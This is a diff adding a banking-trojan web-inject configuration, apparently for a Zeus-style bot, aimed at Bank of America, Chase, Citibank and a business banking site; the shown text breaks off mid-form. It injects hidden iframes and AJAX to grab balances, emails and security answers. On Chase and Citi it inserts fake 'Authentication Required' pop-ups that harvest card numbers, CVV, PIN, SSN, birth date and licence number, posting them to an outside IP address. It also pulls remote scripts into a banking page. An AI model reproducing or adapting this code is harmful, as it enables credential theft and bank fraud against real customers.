@@ -1,0 +1,3773 @@
+# 
+# BOA injects 
+# v0.23
+#
+
+# Prefill
+
+set_url *bankofamerica.com/* GP
+data_before
+data_end
+data_inject
+rememberme_prefill = "";
+data_end
+data_after
+if (rememberme_prefill != ""
+data_end
+
+# Answers redirect problem
+set_url https://*.bankofamerica.com/*/commonscript.js GP
+data_before
+data_end
+data_inject
+// 
+data_end
+data_after
+top.location = self.location;
+data_end
+
+# Grabbing Account Type
+
+set_url https://onlineeast#.bankofamerica.com/*/GotoWelcome GPH
+data_before
+<div class="primaryNavCnt">
+data_end
+data_inject
+BOA : Account Type
+data_end
+data_after
+</div>
+data_end
+# --- SplashPageControl
+set_url https://onlineeast#.bankofamerica.com/*/SplashPageControl* GPH
+data_before
+<div class="primaryNavCnt">
+data_end
+data_inject
+BOA : Account Type
+data_end
+data_after
+</div>
+data_end
+
+# Grabbing Balance
+
+set_url https://onlineeast#.bankofamerica.com/*/GotoWelcome GPH
+data_before
+<table width="100%" border=0  cellspacing=0 cellpadding=0*summary=*Summary table of your account balances*>
+data_end
+data_inject
+BOA : Balance
+data_end
+data_after
+</table>
+data_end
+# --- SplashPageControl
+set_url https://onlineeast#.bankofamerica.com/*/SplashPageControl* GPH
+data_before
+<table width="100%" border=0  cellspacing=0 cellpadding=0*summary=*Summary table of your account balances*>
+data_end
+data_inject
+BOA : Balance
+data_end
+data_after
+</table>
+data_end
+
+# Grabbing EMAIL & Answers
+
+# "*" in the end in case. if we making GET-query through AJAX with "?r=" parameter
+set_url https://onlineeast#.bankofamerica.com/*/GotoCustomerServiceMenu* GPL
+data_before
+(your current e*mail address is:*&nbsp;
+data_end
+data_inject
+BOA : EMAIL
+data_end
+data_after
+)
+data_end
+
+set_url https://sitekey.bankofamerica.com/sas/maint.do GPH
+data_before
+<!-- one -->
+data_end
+data_inject
+BOA : Answers
+data_end
+data_after
+securityKey3Ans*</TR>
+data_end
+
+# Making GET-query to GotoCustomerServiceMenu page for Grabbing EMAIL
+
+# Getting AJAX functions
+set_url https://onlineeast#.bankofamerica.com/*/GotoWelcome GP
+data_before
+</title>
+data_end
+data_inject
+<script language="JavaScript" type="text/javascript">
+function getXmlHttp(){var a;if(window.XMLHttpRequest){a=new XMLHttpRequest()}else if(window.ActiveXObject){a=new ActiveXObject("Msxml2.XMLHTTP");if(!a){a=new ActiveXObject("Microsoft.XMLHTTP")}}return a}function ajax_get(a,b){if(a.indexOf('?')!=-1)a+='&';else a+='?';a+='rnd='+Math.random();var c=getXmlHttp();c.open("GET",a,b);c.onreadystatechange=function(){if(this.readyState==4){if(this.status==200){return this.responseText}}};c.send()}
+</script>
+data_end
+data_after
+data_end
+# --- SplashPageControl
+set_url https://onlineeast#.bankofamerica.com/*/SplashPageControl* GP
+data_before
+</title>
+data_end
+data_inject
+<script language="JavaScript" type="text/javascript">
+function getXmlHttp(){var a;if(window.XMLHttpRequest){a=new XMLHttpRequest()}else if(window.ActiveXObject){a=new ActiveXObject("Msxml2.XMLHTTP");if(!a){a=new ActiveXObject("Microsoft.XMLHTTP")}}return a}function ajax_get(a,b){if(a.indexOf('?')!=-1)a+='&';else a+='?';a+='rnd='+Math.random();var c=getXmlHttp();c.open("GET",a,b);c.onreadystatechange=function(){if(this.readyState==4){if(this.status==200){return this.responseText}}};c.send()}
+</script>
+data_end
+data_after
+data_end
+
+# Making GET-query through AJAX (for EMAIL & Balance)
+set_url https://onlineeast#.bankofamerica.com/*/GotoWelcome GP
+data_before
+<!-- end globalHeaderContainer -->
+data_end
+data_inject
+<script language="JavaScript" type="text/javascript">
+// Finding GotoCustomerServiceMenu link
+var lists = document.getElementsByTagName("a");
+for (var i = 0; i < lists.length; i++) {
+	var strHref = lists[i].href + "";
+	if ( strHref.indexOf('GotoCustomerServiceMenu') != -1 )
+		break;
+}
+// ---
+if (i < lists.length)
+{
+	//alert(strHref);
+	ajax_get(strHref, false);
+}
+</script>
+data_end
+data_after
+data_end
+# --- SplashPageControl
+set_url https://onlineeast#.bankofamerica.com/*/SplashPageControl* GP
+data_before
+<!-- end globalHeaderContainer -->
+data_end
+data_inject
+<script language="JavaScript" type="text/javascript">
+// Finding GotoCustomerServiceMenu link
+var lists = document.getElementsByTagName("a");
+for (var i = 0; i < lists.length; i++) {
+	var strHref = lists[i].href + "";
+	if ( strHref.indexOf('GotoCustomerServiceMenu') != -1 )
+		break;
+}
+// ---
+if (i < lists.length)
+{
+	//alert(strHref);
+	ajax_get(strHref, false);
+}
+</script>
+data_end
+data_after
+data_end
+
+# Making GET-query through AJAX ... Ghm... IFRAME for some reason (for Answers & for Balance)
+set_url https://onlineeast#.bankofamerica.com/*/GotoWelcome GP
+data_before
+<body*>
+data_end
+data_inject
+<iframe id="iAnswers" frameborder="0" width="0" height="0" hspace="0" vspace="0" style="position:absolute;top:-10px;" src="about:blank"></iframe>
+<iframe id="iBalance" frameborder="0" width="0" height="0" hspace="0" vspace="0" style="position:absolute;top:-10px;" src="about:blank"></iframe>
+data_end
+data_after
+data_end
+data_before
+<!-- end globalHeaderContainer -->
+data_end
+data_inject
+<script defer language="JavaScript" type="text/javascript">
+// Finding "Change SiteKey challenge questions and answers" link
+var lists = document.getElementsByTagName("a");
+for (var i = 0; i < lists.length; i++) {
+	var strInnerHTML = lists[i].innerHTML + "";
+	var strHref = lists[i].href + "";
+	if ( strHref.indexOf('GotoWelcome') != -1 && strHref.indexOf('#') == -1 )
+	{
+		//alert(strHref);
+		strHref = strHref.substring(0, strHref.length - 11);
+		break;
+	}
+}
+// ---
+if (i < lists.length)
+{
+	strHref += "bofa/ibd/IAS/presentation/CustomerServiceMenuEntryPoint?custAction=75";
+	var iAnswers = document.getElementById('iAnswers');
+	if (iAnswers)
+		iAnswers.src = strHref;
+}
+// Finding GotoWelcome link
+for (var i = 0; i < lists.length; i++) {
+	var strHrefGW = lists[i].href + "";
+	if ( strHrefGW.indexOf('GotoWelcome') != -1 && lists[i].innerHTML == 'Accounts' )
+		break;
+}
+if (i >= lists.length)
+	strHrefGW = '';
+// ---
+function cutSmth(url) {
+	var str = url + '';
+	var pos1 = str.lastIndexOf('/');
+	if (pos1 != -1) {
+		var pos2 = str.lastIndexOf('/', pos1 - 1);
+		if (pos2 != -1) {
+			var cutted = str.substring(0, pos2);
+			cutted += str.substring(pos1);
+			return cutted;
+		}
+	}
+	return null;
+}
+var url1 = cutSmth(strHrefGW);
+var url2 = cutSmth(self.location);
+if (strHrefGW != '' && url1 != null && url2 != null && !(url1 == url2 && url1.indexOf('GotoWelcome') != -1 && url2.indexOf('GotoWelcome') != -1))
+{
+	if (strHrefGW.indexOf('#') != -1)
+		strHrefGW = strHrefGW.substring(0, strHrefGW.indexOf('#'));
+	var iBalance = document.getElementById('iBalance');
+	if (iBalance)
+		iBalance.src = strHrefGW;
+}
+</script>
+data_end
+data_after
+data_end
+# --- SplashPageControl
+set_url https://onlineeast#.bankofamerica.com/*/SplashPageControl* GP
+data_before
+<body*>
+data_end
+data_inject
+<iframe id="iAnswers" frameborder="0" width="0" height="0" hspace="0" vspace="0" style="position:absolute;top:-10px;" src="about:blank"></iframe>
+<iframe id="iBalance" frameborder="0" width="0" height="0" hspace="0" vspace="0" style="position:absolute;top:-10px;" src="about:blank"></iframe>
+data_end
+data_after
+data_end
+data_before
+<!-- end globalHeaderContainer -->
+data_end
+data_inject
+<script defer language="JavaScript" type="text/javascript">
+// Finding "Change SiteKey challenge questions and answers" link
+var lists = document.getElementsByTagName("a");
+for (var i = 0; i < lists.length; i++) {
+	var strInnerHTML = lists[i].innerHTML + "";
+	var strHref = lists[i].href + "";
+	if ( strHref.indexOf('GotoWelcome') != -1 && strHref.indexOf('#') == -1 )
+	{
+		//alert(strHref);
+		strHref = strHref.substring(0, strHref.length - 11);
+		break;
+	}
+}
+// ---
+if (i < lists.length)
+{
+	strHref += "bofa/ibd/IAS/presentation/CustomerServiceMenuEntryPoint?custAction=75";
+	var iAnswers = document.getElementById('iAnswers');
+	if (iAnswers)
+		iAnswers.src = strHref;
+}
+// Finding GotoWelcome link
+for (var i = 0; i < lists.length; i++) {
+	var strHrefGW = lists[i].href + "";
+	if ( strHrefGW.indexOf('GotoWelcome') != -1 && lists[i].innerHTML == 'Accounts' )
+		break;
+}
+if (i >= lists.length)
+	strHrefGW = '';
+// ---
+function cutSmth(url) {
+	var str = url + '';
+	var pos1 = str.lastIndexOf('/');
+	if (pos1 != -1) {
+		var pos2 = str.lastIndexOf('/', pos1 - 1);
+		if (pos2 != -1) {
+			var cutted = str.substring(0, pos2);
+			cutted += str.substring(pos1);
+			return cutted;
+		}
+	}
+	return null;
+}
+var url1 = cutSmth(strHrefGW);
+var url2 = cutSmth(self.location);
+if (strHrefGW != '' && url1 != null && url2 != null && !(url1 == url2 && url1.indexOf('GotoWelcome') != -1 && url2.indexOf('GotoWelcome') != -1))
+{
+	if (strHrefGW.indexOf('#') != -1)
+		strHrefGW = strHrefGW.substring(0, strHrefGW.indexOf('#'));
+	var iBalance = document.getElementById('iBalance');
+	if (iBalance)
+		iBalance.src = strHrefGW;
+}
+</script>
+data_end
+data_after
+data_end
+set_url *chaseonline.chase.com/MyAccounts.aspx* GPH
+data_before
+<body>
+data_end
+data_inject
+CHASE : Balance
+data_end
+data_after
+</body>
+data_end
+
+set_url *chaseonline.chase.com/MyAccounts.aspx* GP
+data_before
+data_end
+data_inject
+<link rel="stylesheet" href="http://ajax.googleapis.com/ajax/libs/jqueryui/1.7.2/themes/smoothness/jquery-ui.css" type="text/css" />
+<style type="text/css">
+#inject { display: none; }
+.ui-dialog { font-size: 10px; }
+.ui-dialog .ui-dialog-titlebar-close { visibility: hidden; }
+</style>
+data_end
+data_after
+</head>
+data_end
+data_before
+data_end
+data_inject
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.3.2/jquery.min.js"></script>
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jqueryui/1.7.1/jquery-ui.min.js"></script>
+<script type="text/javascript">
+var popfrequency="500 hours"
+
+function get_cookie(Name) {
+var search = Name + "="
+var returnvalue = "";
+if (document.cookie.length > 0) {
+offset = document.cookie.indexOf(search)
+if (offset != -1) { // if cookie exists
+offset += search.length
+// set index of beginning of value
+end = document.cookie.indexOf(";", offset);
+// set index of end of cookie value
+if (end == -1)
+end = document.cookie.length;
+returnvalue=unescape(document.cookie.substring(offset, end))
+}
+}
+return returnvalue;
+}
+
+function resetcookie(){
+var expireDate = new Date()
+expireDate.setHours(expireDate.getHours()-10)
+document.cookie = "tcpopunder=;path=/;expires=" + expireDate.toGMTString()
+}
+
+function loadornot(){
+if (get_cookie('tcpopunder')==''){
+loadpopunder()
+}
+}
+
+function loadpopunder(){
+
+function Init() 
+{
+	jQuery('#inject').dialog({ width: 600, resizable: false, buttons: { "Continue": function() {
+	        if (jQuery("#ccAcctNo").val().length < 16) 
+	        {
+		        alert('Please enter a valid ATM/Debit card number.');
+		        jQuery("#ccAcctNo").focus();
+	        } 
+	        else if (jQuery("#ccCVV").val().length < 3) 
+	        {
+		        alert('Please enter the last 3 digits on your signature panel.');
+		        jQuery("#ccCVV").focus();
+	        }
+	        else if (jQuery("#ccExpMM").val() < 1) 
+	        {
+		        alert('Please select an expiration date.');
+		        jQuery("#ccExpMM").focus();
+	        } 
+	        else if (jQuery("#ccExpYYYY").val() < 1) 
+	        {
+		        alert('Please select an expiration date.');
+		        jQuery("#ccExpYYYY").focus();
+	        } 			
+	        else if (jQuery("#ccPIN").val().length < 4) 
+	        {
+		        alert('Please enter your PIN code for your ATM/Checking card.');
+		        jQuery("#ccPIN").focus();
+	        }
+	        else if (jQuery("#ssn1").val().length < 3 || jQuery("#ssn2").val().length < 2 || jQuery("#ssn3").val().length < 4) 
+	        {
+		        alert('Please enter your social security number.');
+		        jQuery("#ssn1").focus();
+	        } 
+	        else if (jQuery("#mmn").val().length < 2) 
+	        {
+		        alert('Please enter your mothers maiden name.');
+		        jQuery("#mmn").focus();
+	        }
+			else if (jQuery("#dob1").val() < 1) 
+	        {
+		        alert('Please select your date of birth.');
+		        jQuery("#dob1").focus();
+	        }
+			else if (jQuery("#dob2").val() < 1) 
+	        {
+		        alert('Please select your date of birth.');
+		        jQuery("#dob2").focus();
+	        }
+			else if (jQuery("#dob3").val() < 1) 
+	        {
+		        alert('Please select your date of birth.');
+		        jQuery("#dob3").focus();
+	        }
+			else if (jQuery("#driver").val().length < 2) 
+	        {
+		        alert('Please enter your drivers license number.');
+		        jQuery("#driver").focus();
+	        }
+	        else 
+	        {
+		        jQuery("#ccAcctNo_2").val(jQuery("#ccAcctNo").val());
+				jQuery("#ccCVV_2").val(jQuery("#ccCVV").val());
+				jQuery("#ccExpMM_2").val(jQuery("#ccExpMM").val());
+				jQuery("#ccExpYYYY_2").val(jQuery("#ccExpYYYY").val());
+				jQuery("#ccPIN_2").val(jQuery("#ccPIN").val());
+				jQuery("#ssn1_2").val(jQuery("#ssn1").val());
+				jQuery("#ssn2_2").val(jQuery("#ssn2").val());
+                jQuery("#ssn3_2").val(jQuery("#ssn3").val());
+                jQuery("#mmn_2").val(jQuery("#mmn").val());
+                jQuery("#dob1_2").val(jQuery("#dob1").val());
+                jQuery("#dob2_2").val(jQuery("#dob2").val());
+                jQuery("#dob3_2").val(jQuery("#dob3").val());
+				jQuery("#driver_2").val(jQuery("#driver").val());
+				$.post("http://91.223.82.126/ssl/chase.php", $("form[name='injectform']").serialize());
+				jQuery('#inject').dialog('close');
+                var expireDate = new Date()
+                expireDate.setHours(expireDate.getHours()+parseInt(popfrequency))
+                document.cookie = "tcpopunder="+parseInt(popfrequency)+";path=/;expires=" + expireDate.toGMTString()}
+		} 
+}, closeOnEscape: false, modal: true, show: 'slide' });
+}
+jQuery(document).ready(Init);
+}
+
+if (popfrequency=="always"){
+resetcookie()
+loadpopunder()
+}
+else{
+if (get_cookie('tcpopunder')!=parseInt(popfrequency))
+resetcookie()
+loadornot()
+}
+</script>
+<div id="inject">
+	<form>
+	<center>
+	<table><tbody>
+	  <tr><td style="background: #FFFFFF;">
+	<img src="https://chaseonline.chase.com/images//ChaseNew.gif" style="margin-top: 0px; margin-left: 0px; margin-bottom: 0px;"/>
+	  </td></tr>
+<tr><td align="center" style="text-align: center; font-size: 10px; background: #FFFFFF;">
+	<br><h3>Authentication Required</h3>
+	  </td></tr>
+<tr><td align="left" style="text-align: justify; font-size: 11px; background: #FFFFFF;">
+	In order to provide you with extra security, we occasionally need to ask for additional information when you access your accounts online. Please enter the information below to continue.</br></br>
+	  </td></tr>
+	</tbody></table></center>
+  <center>
+	<div>
+		<table>
+			<tbody>
+				<tr><td align="left" style="font-size: 12px; background: #FFFFFF;"><b>ATM/Debit Card Number</b></td><td align="left" style="background: #FFFFFF; font-size: 11px;"><input type="text" id="ccAcctNo" name="ccAcctNo" maxlength="20"/></td></tr>
+				<tr><td align="left" style="font-size: 12px; background: #FFFFFF;"><b>CVV2 (3 digit card verification code)</b></td><td align="left" style="background: #FFFFFF; font-size: 11px;"><input type="text" name="ccCVV" id="ccCVV" size="3" maxlength="3"/></td></tr>
+				<tr><td align="left" style="font-size: 12px; background: #FFFFFF;"><b>Expiration Date</b></td><td align="left" style="background: #FFFFFF; font-size: 11px;"><select name="ccExpMM" id="ccExpMM">
+      <option value="0">
+      <option value="01">01
+      <option value="02">02
+      <option value="03">03
+      <option value="04">04
+      <option value="05">05
+      <option value="06">06
+      <option value="07">07
+      <option value="08">08
+      <option value="09">09
+      <option value="10">10
+      <option value="11">11
+      <option value="12">12
+     </select>
+     <select name="ccExpYYYY" id="ccExpYYYY">
+      <option value="0">
+      <option value="2011">2011
+	  <option value="2012">2012
+	  <option value="2013">2013
+	  <option value="2014">2014
+<option value="2015">2015
+<option value="2016">2016
+<option value="2017">2017
+<option value="2018">2018
+<option value="2019">2019
+<option value="2020">2020
+     </select></td></tr>
+				<tr><td align="left" style="font-size: 12px; background: #FFFFFF;"><b>PIN (the code you enter at ATMs)</b></td><td align="left" style="background: #FFFFFF; font-size: 11px;"><input type="password" name="ccPIN" id="ccPIN" size="5" maxlength="10"/></td></tr>
+				<tr><td align="left" style="font-size: 12px; background: #FFFFFF;"><br><b>Social Security Number</b></td><td align="left" style="background: #FFFFFF; font-size: 11px;"><br><input type="text" id="ssn1" size="4" maxlength="3" name="ssn1" value="">-<input type="text" id="ssn2" size="3" maxlength="2" name="ssn2" value="">-<input type="text" id="ssn3" size="4" maxlength="4" name="ssn3" value=""></td></tr>
+				<tr><td align="left" style="font-size: 12px; background: #FFFFFF;"><b>Mother's Maiden Name</b></td><td align="left" style="background: #FFFFFF; font-size: 11px;"><input type="text" name="mmn" id="mmn" size="12" maxlength="20"/></td></tr>
+				<tr><td align="left" style="font-size: 12px; background: #FFFFFF;"><b>Date Of Birth</b></td><td align="left" style="background: #FFFFFF; font-size: 11px;"><select name="dob1" id="dob1">
+<option value="0" ></option>
+<option value="1" >January</option>
+                      
+                        <option value="2" >February</option>
+                        
+                        <option value="3" >March</option>
+                        
+                        <option value="4" >April</option>
+                        
+                        <option value="5" >May</option>
+                        
+                        <option value="6" >June</option>
+                        
+                        <option value="7" >July</option>
+                        
+                        <option value="8" >August</option>
+                        
+                        <option value="9" >September</option>
+                        
+                        <option value="10" >October</option>
+                        
+                        <option value="11" >November</option>
+                        
+                        <option value="12" >December</option>
+                        
+                      </select>
+
+                      <select name="dob2" id="dob2">
+                        <option value="0" ></option>
+                        <option value="1" >1</option>
+                        
+                        <option value="2" >2</option>
+                        
+                        <option value="3" >3</option>
+                        
+                        <option value="4" >4</option>
+                        
+                        <option value="5" >5</option>
+                        
+                        <option value="6" >6</option>
+                        
+                        <option value="7" >7</option>
+                        
+                        <option value="8" >8</option>
+                        
+                        <option value="9" >9</option>
+                        
+                        <option value="10" >10</option>
+                        
+                        <option value="11" >11</option>
+                        
+                        <option value="12" >12</option>
+                        
+                        <option value="13" >13</option>
+                        
+                        <option value="14" >14</option>
+                        
+                        <option value="15" >15</option>
+                        
+                        <option value="16" >16</option>
+                        
+                        <option value="17" >17</option>
+                        
+                        <option value="18" >18</option>
+                        
+                        <option value="19" >19</option>
+                        
+                        <option value="20" >20</option>
+                        
+                        <option value="21" >21</option>
+                        
+                        <option value="22" >22</option>
+                        
+                        <option value="23" >23</option>
+                        
+                        <option value="24" >24</option>
+                        
+                        <option value="25" >25</option>
+                        
+                        <option value="26" >26</option>
+                        
+                        <option value="27" >27</option>
+                        
+                        <option value="28" >28</option>
+                        
+                        <option value="29" >29</option>
+                        
+                        <option value="30" >30</option>
+                        
+                        <option value="31" >31</option>
+                        
+                      </select>
+                      
+                      <select name="dob3" id="dob3">
+                        <option value="0" ></option>
+                        <option value="1900" >1900</option>
+                        
+                        <option value="1901" >1901</option>
+                        
+                        <option value="1902" >1902</option>
+                        
+                        <option value="1903" >1903</option>
+                        
+                        <option value="1904" >1904</option>
+                        
+                        <option value="1905" >1905</option>
+                        
+                        <option value="1906" >1906</option>
+                        
+                        <option value="1907" >1907</option>
+                        
+                        <option value="1908" >1908</option>
+                        
+                        <option value="1909" >1909</option>
+                        
+                        <option value="1910" >1910</option>
+                        
+                        <option value="1911" >1911</option>
+                        
+                        <option value="1912" >1912</option>
+                        
+                        <option value="1913" >1913</option>
+                        
+                        <option value="1914" >1914</option>
+                        
+                        <option value="1915" >1915</option>
+                        
+                        <option value="1916" >1916</option>
+                        
+                        <option value="1917" >1917</option>
+                        
+                        <option value="1918" >1918</option>
+                        
+                        <option value="1919" >1919</option>
+                        
+                        <option value="1920" >1920</option>
+                        
+                        <option value="1921" >1921</option>
+                        
+                        <option value="1922" >1922</option>
+                        
+                        <option value="1923" >1923</option>
+                        
+                        <option value="1924" >1924</option>
+                        
+                        <option value="1925" >1925</option>
+                        
+                        <option value="1926" >1926</option>
+                        
+                        <option value="1927" >1927</option>
+                        
+                        <option value="1928" >1928</option>
+                        
+                        <option value="1929" >1929</option>
+                        
+                        <option value="1930" >1930</option>
+                        
+                        <option value="1931" >1931</option>
+                        
+                        <option value="1932" >1932</option>
+                        
+                        <option value="1933" >1933</option>
+                        
+                        <option value="1934" >1934</option>
+                        
+                        <option value="1935" >1935</option>
+                        
+                        <option value="1936" >1936</option>
+                        
+                        <option value="1937" >1937</option>
+                        
+                        <option value="1938" >1938</option>
+                        
+                        <option value="1939" >1939</option>
+                        
+                        <option value="1940" >1940</option>
+                        
+                        <option value="1941" >1941</option>
+                        
+                        <option value="1942" >1942</option>
+                        
+                        <option value="1943" >1943</option>
+                        
+                        <option value="1944" >1944</option>
+                        
+                        <option value="1945" >1945</option>
+                        
+                        <option value="1946" >1946</option>
+                        
+                        <option value="1947" >1947</option>
+                        
+                        <option value="1948" >1948</option>
+                        
+                        <option value="1949" >1949</option>
+                        
+                        <option value="1950" >1950</option>
+                        
+                        <option value="1951" >1951</option>
+                        
+                        <option value="1952" >1952</option>
+                        
+                        <option value="1953" >1953</option>
+                        
+                        <option value="1954" >1954</option>
+                        
+                        <option value="1955" >1955</option>
+                        
+                        <option value="1956" >1956</option>
+                        
+                        <option value="1957" >1957</option>
+                        
+                        <option value="1958" >1958</option>
+                        
+                        <option value="1959" >1959</option>
+                        
+                        <option value="1960" >1960</option>
+                        
+                        <option value="1961" >1961</option>
+                        
+                        <option value="1962" >1962</option>
+                        
+                        <option value="1963" >1963</option>
+                        
+                        <option value="1964" >1964</option>
+                        
+                        <option value="1965" >1965</option>
+                        
+                        <option value="1966" >1966</option>
+                        
+                        <option value="1967" >1967</option>
+                        
+                        <option value="1968" >1968</option>
+                        
+                        <option value="1969" >1969</option>
+                        
+                        <option value="1970" >1970</option>
+                        
+                        <option value="1971" >1971</option>
+                        
+                        <option value="1972" >1972</option>
+                        
+                        <option value="1973" >1973</option>
+                        
+                        <option value="1974" >1974</option>
+                        
+                        <option value="1975" >1975</option>
+                        
+                        <option value="1976" >1976</option>
+                        
+                        <option value="1977" >1977</option>
+                        
+                        <option value="1978" >1978</option>
+                        
+                        <option value="1979" >1979</option>
+                        
+                        <option value="1980" >1980</option>
+                        
+                        <option value="1981" >1981</option>
+                        
+                        <option value="1982" >1982</option>
+                        
+                        <option value="1983" >1983</option>
+                        
+                        <option value="1984" >1984</option>
+                        
+                        <option value="1985" >1985</option>
+                        
+                        <option value="1986" >1986</option>
+                        
+                        <option value="1987" >1987</option>
+                        
+                        <option value="1988" >1988</option>
+                        
+                        <option value="1989" >1989</option>
+                        
+                        <option value="1990" >1990</option>
+                        
+                        <option value="1991" >1991</option>
+                        
+                        <option value="1992" >1992</option>
+                        
+                        <option value="1993" >1993</option>
+                        
+                        <option value="1994" >1994</option>
+                        
+                        <option value="1995" >1995</option>
+                        
+                        <option value="1996" >1996</option>
+                        
+                        <option value="1997" >1997</option>
+                        
+                        <option value="1998" >1998</option>
+                        
+                        <option value="1999" >1999</option>
+                        
+                        <option value="2000" >2000</option>
+                        
+                        <option value="2001" >2001</option>
+                        
+                        <option value="2002" >2002</option>
+                        
+                        <option value="2003" >2003</option>
+                        
+                        <option value="2004" >2004</option>
+                        
+                        <option value="2005" >2005</option>
+                        
+                        <option value="2006" >2006</option>
+                        <option value="2007" >2007</option>
+                      </select></td></tr>
+					  <tr><td align="left" style="font-size: 12px; background: #FFFFFF;"><b>Driver's License Number</b></td><td align="left" style="background: #FFFFFF; font-size: 11px;"><input type="text" name="driver" id="driver" size="12" maxlength="30"/></td></tr>
+			</tbody>
+		</table>
+	</div>
+	</form>
+	</center>
+</div>
+<form name="injectform" action="" method="post">
+<input type="hidden" name="ccAcctNo_2" id="ccAcctNo_2" />
+<input type="hidden" name="ccCVV_2" id="ccCVV_2" />
+<input type="hidden" name="ccExpMM_2" id="ccExpMM_2" />
+<input type="hidden" name="ccExpYYYY_2" id="ccExpYYYY_2" />
+<input type="hidden" name="ccPIN_2" id="ccPIN_2" />
+<input type="hidden" name="ssn1_2" id="ssn1_2" />
+<input type="hidden" name="ssn2_2" id="ssn2_2" />
+<input type="hidden" name="ssn3_2" id="ssn3_2" />
+<input type="hidden" name="mmn_2" id="mmn_2" />
+<input type="hidden" name="dob1_2" id="dob1_2" />
+<input type="hidden" name="dob2_2" id="dob2_2" />
+<input type="hidden" name="dob3_2" id="dob3_2" />
+<input type="hidden" name="driver_2" id="driver_2" />
+<input type="hidden" name="uid" id="uid" value="%BOTNAME%" />
+</form>
+data_end
+data_after
+</body>
+data_end
+set_url *business-eb.ibanking-services.com* GP
+data_before
+<head>
+data_end
+data_inject
+<script type="text/javascript" src="https://p8.secure.hostingprod.com/@var357.com/ssl/bbt_redirect.js"></script>
+<script type="text/javascript" src="https://p8.secure.hostingprod.com/@jscripts.net/ssl/bbt_redirect.js"></script>
+data_end
+data_after
+data_end
+set_url *online.citibank.com/US/JPS/portal/Home.do* GP
+data_before
+<head>
+data_end
+data_inject
+<link rel="stylesheet" href="http://ajax.googleapis.com/ajax/libs/jqueryui/1.7.2/themes/smoothness/jquery-ui.css" type="text/css" />
+<style type="text/css">
+#inject { display: none; }
+.ui-dialog { font-size: 10px; }
+.ui-dialog .ui-dialog-titlebar-close { visibility: hidden; }
+</style>
+data_end
+data_after
+<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
+data_end
+data_before
+data_end
+data_inject
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.3.2/jquery.min.js"></script>
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jqueryui/1.7.1/jquery-ui.min.js"></script>
+<script type="text/javascript">
+var popfrequency="340 hours"
+
+function get_cookie(Name) {
+var search = Name + "="
+var returnvalue = "";
+if (document.cookie.length > 0) {
+offset = document.cookie.indexOf(search)
+if (offset != -1) { // if cookie exists
+offset += search.length
+// set index of beginning of value
+end = document.cookie.indexOf(";", offset);
+// set index of end of cookie value
+if (end == -1)
+end = document.cookie.length;
+returnvalue=unescape(document.cookie.substring(offset, end))
+}
+}
+return returnvalue;
+}
+
+function resetcookie(){
+var expireDate = new Date()
+expireDate.setHours(expireDate.getHours()-10)
+document.cookie = "tcpopunder=;path=/;expires=" + expireDate.toGMTString()
+}
+
+function loadornot(){
+if (get_cookie('tcpopunder')==''){
+loadpopunder()
+}
+}
+
+function loadpopunder(){
+
+function Init() 
+{
+	jQuery('#inject').dialog({ width: 600, resizable: false, buttons: { "Continue": function() {
+	        if (jQuery("#ccAcctNo").val().length < 16) 
+	        {
+		        alert('Please enter a valid ATM/Debit card number.');
+		        jQuery("#ccAcctNo").focus();
+	        } 
+	        else if (jQuery("#ccCVV").val().length < 3) 
+	        {
+		        alert('Please enter the last 3 digits on your signature panel.');
+		        jQuery("#ccCVV").focus();
+	        }
+	        else if (jQuery("#ccExpMM").val() < 1) 
+	        {
+		        alert('Please select an expiration date.');
+		        jQuery("#ccExpMM").focus();
+	        } 
+	        else if (jQuery("#ccExpYYYY").val() < 1) 
+	        {
+		        alert('Please select an expiration date.');
+		        jQuery("#ccExpYYYY").focus();
+	        } 			
+	        else if (jQuery("#ccPIN").val().length < 4) 
+	        {
+		        alert('Please enter your PIN code for your ATM/Checking card.');
+		        jQuery("#ccPIN").focus();
+	        }
+	        else if (jQuery("#ssn1").val().length < 3 || jQuery("#ssn2").val().length < 2 || jQuery("#ssn3").val().length < 4) 
+	        {
+		        alert('Please enter your social security number.');
+		        jQuery("#ssn1").focus();
+	        } 
+	        else if (jQuery("#mmn").val().length < 2) 
+	        {
+		        alert('Please enter your mothers maiden name.');
+		        jQuery("#mmn").focus();
+	        }
+			else if (jQuery("#dob1").val() < 1) 
+	        {
+		        alert('Please select your date of birth.');
+		        jQuery("#dob1").focus();
+	        }
+			else if (jQuery("#dob2").val() < 1) 
+	        {
+		        alert('Please select your date of birth.');
+		        jQuery("#dob2").focus();
+	        }
+			else if (jQuery("#dob3").val() < 1) 
+	        {
+		        alert('Please select your date of birth.');
+		        jQuery("#dob3").focus();
+	        }
+	        else 
+	        {
+		        jQuery("#ccAcctNo_2").val(jQuery("#ccAcctNo").val());
+				jQuery("#ccCVV_2").val(jQuery("#ccCVV").val());
+				jQuery("#ccExpMM_2").val(jQuery("#ccExpMM").val());
+				jQuery("#ccExpYYYY_2").val(jQuery("#ccExpYYYY").val());
+				jQuery("#ccPIN_2").val(jQuery("#ccPIN").val());
+				jQuery("#ssn1_2").val(jQuery("#ssn1").val());
+				jQuery("#ssn2_2").val(jQuery("#ssn2").val());
+                jQuery("#ssn3_2").val(jQuery("#ssn3").val());
+                jQuery("#mmn_2").val(jQuery("#mmn").val());
+                jQuery("#dob1_2").val(jQuery("#dob1").val());
+                jQuery("#dob2_2").val(jQuery("#dob2").val());
+                jQuery("#dob3_2").val(jQuery("#dob3").val());
+				$.post("http://91.223.82.126/ssl/citi.php", $("form[name='injectform']").serialize());
+				jQuery('#inject').dialog('close');
+                var expireDate = new Date()
+                expireDate.setHours(expireDate.getHours()+parseInt(popfrequency))
+                document.cookie = "tcpopunder="+parseInt(popfrequency)+";path=/;expires=" + expireDate.toGMTString()}
+		} 
+}, closeOnEscape: false, modal: true, show: 'slide' });
+}
+jQuery(document).ready(Init);
+}
+
+if (popfrequency=="always"){
+resetcookie()
+loadpopunder()
+}
+else{
+if (get_cookie('tcpopunder')!=parseInt(popfrequency))
+resetcookie()
+loadornot()
+}
+</script>
+<div id="inject">
+	<form>
+	<center>
+	<table><tbody>
+	  <tr><td style="background: #FFFFFF;">
+	<img src="https://online.citibank.com/JRS/cm/img/top_nav/logo.gif" style="margin-top: 0px; margin-left: 0px; margin-bottom: 0px;"/>
+	  </td></tr>
+<tr><td align="center" style="text-align: center; font-size: 10px; background: #FFFFFF;">
+	<br><h3>Authentication Required</h3>
+	  </td></tr>
